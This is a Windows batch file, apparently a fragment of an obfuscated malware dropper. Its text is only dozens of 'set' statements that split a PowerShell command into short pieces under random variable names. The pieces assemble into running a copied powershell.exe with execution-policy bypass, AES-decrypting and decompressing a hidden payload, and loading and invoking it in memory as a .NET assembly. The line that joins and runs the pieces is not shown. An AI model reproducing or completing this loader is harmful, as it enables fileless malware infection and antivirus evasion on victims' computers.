@echo off
set "JVLEXrrwSS=1."
set "hUJIFbNmYp=rs"
set "eUqKjhXlCt=nd"
set "DqvvlwiKzB=st"
set "haNQoezOyu=xe"
set "TtTrXFXfnE=Sy"
set "bkKBKfHFMl=py"
set "JrYBFzVGXF=we"
set "ECxkzBNlSn=32"
set "oziqsVmLfw=po"
set "JWRmMPutKx=ws"
set "EauViNTDND=0\"
set "eFqwimcTqI=ll"
set "RmGhvtQAKr=.e"
set "kLowWJaiRs=co"
set "PqalFnovuL=\W"
set "hFSkckNvlc=he"
set "DKQFiLDvNr=s\"
set "ciigcbjFNq=\v"
set "uezKcFbJzv=rS"
set "MkFpLCNmkE=we"
set "wcNdUCOtFb= C"
set "gvEqKudKBy=em"
set "MAuVABDnzs= /"
set "vHlVXzrBAj=ll"
set "fIpQWLFlZb=Po"
set "VHCPSNvnQj=ow"
set "dvSixTXMRp=he"
set "dLzrpCJuzo=Wi"
set "znPxLBBXOg=:\"
set "CSWmlyODGC=in"
set "BnDOabSkWJ=do"
set "ZUWpxVZKOI=y "
set "wFMFNcempQ= %~dp0"
set "oEVwCrJkkM=cd"
set "lSZZMpxyUY=rWOx"
set "jcEvaAcmzI=[Sys"
set "riverzYcZE=e = "
set "tBBqGyFxPw=LQ);"
set "EVGpMlCXAs=Secu"
set "tNZGttSGxJ=6esa"
set "lJGzjUPgzy=bqDq"
set "ZYYLgVbyma=] -j"
set "PepufGotRx=Kq.D"
set "mkHMieuqOW=-ep "
set "vTONbawNoF=ing("
set "dcvRdZrgNw=ispo"
set "ufsVSIYFnt=ZYYc"
set "akxkoHZtYS=736u"
set "YyivJOeNUY='gni"
set "UgcspPJODG=nage"
set "yRLwQkJoIY=();$"
set "EwOGuMovAx=y.Cr"
set "aTrDXnuvwz=bjec"
set "NoIlvbjzqS=eUqK"
set "MSzheszGGr=[-1."
set "tulgphcNqt=txuH"
set "jNwqSdgdoW=$WLE"
set "XHNTBtzLPQ=Stre"
set "ZbBvawhBiW=$aqL"
set "nxkJCvjDVp=m(, "
set "YOvpvfczIx=pres"
set "svsSBNNaXX=($rW"
set "jwpPbYFrfU=Invo"
set "xVlDFdQvEP=, $W"
set "BNPuOdSSsO=ose("
set "VRAfhsLoDh=ecry"
set "hsAjBhYSHp=saBm"
set "aRomGKNWOv=lBlo"
set "oqDSPlRaYc=form"
set "nxWtvoVrvI=-nop"
set "JLkmPrZJPI=LQ.T"
set "IplUIzuvCg=Obje"
set "wRemglHBqd=;$Nt"
set "EBpejTKTix=::('"
set "KOmnnwrfkl=EZN."
set "XQPuTeBZeF= = N"
set "ulPJuIZByA=Obje"
set "DsfsNrZfSQ=pDZz"
set "pPfpEGojfy=..-1"
set "CpUtJgfpqc=Dq);"
set "jZOLMUPYcw=rity"
set "NDvcddFnwY=ach "
set "DmoTcNXUkb=PKCS"
set "oisfWAWmgU=.Dis"
set "wEFkyYCQav= New"
set "VjfaZaKpqd=stem"
set "lSuRNHRZzx=ss -"
set "AMZahrJyxE=pher"
set "RBbDLapRmO= = $"
set "BSxuUjgzkF=yTo("
set "iRHgzySHbm=();$"
set "qBFmhTvFHA=Fina"
set "oKluaiqEmh=mory"
set "vyuolVyNNz=.IO."
set "VadncpsWyd=ypto"
set "hjGTWktYck=n ''"
set "meVmKYeKtY=aqLd"
set "KfCEFmdBwA=urit"
set "qEIUxflGJy=]::N"
set "yWMlYVMVDF=Bmor"
set "roeMppvBNa=and "
set "rdjeDYKLdw=Syst"
set "gmIvyYUSdi=[]] "
set "yBRecEYNEn=('%*'"
set "iLKGsEfrpY=6] -"
set "fSLEIibpKw=ke($"
set "elwiWguBQU=Disp"
set "GimAoWjqUm=]::("
set "zQmZUcTFoQ=WbqD"
set "veyyInwoIP=ptog"
set "ZhJmtkhTVa=e]::"
set "ZZhFqWnmzP=('l0"
set "hmIJKUqIVE=pose"
set "uhDIGodjrK=Syst"
set "FtbvqCubvD=.Com"
set "HSQbNnVOPC===')"
set "hUfcqRFcAc=$nQt"
set "dwSQuyScGc=File"
set "NiabEpTtLt=X.Su"
set "ivmghGUsQt=gnir"
set "CHjEcpuHel== [S"
set "CQYLJtzvcn=New-"
set "SJuQIomUMr=$nQt"
set "yQDshXaykw=embl"
set "wVkQsNOfPD=am;$"
set "MWBcLIBaZw=3); "
set "gmfSIeGdGP= '')"
set "JQVvqSzzSG=[Env"
set "WhbarcNwKo=).Sp"
set "uhjUfryYLj=[Sys"
set "xZUduQyvfY=TllA"
set "LeUicwBlFy=New-"
set "QWlxoXxrPK=.Cry"
set "kEwpkUCdZA= '')"
set "LWdbTbkOeo=$nQt"
set "qUnSwbReEn=-Obj"
set "DnEeVqJeUs=ewLi"
set "gQvuVNRukB=:('g"
set "QnYtsZwfXz=oL'["
set "NVxjVDQfMJ=tem."
set "QOnPkXbBhj=ress"
set "kyZzBxHUsf=rans"
set "fPKoiDKyqk=AcWG"
set "LKfbiITMsI=WbqD"
set "qxaKGkvbFN=ress"
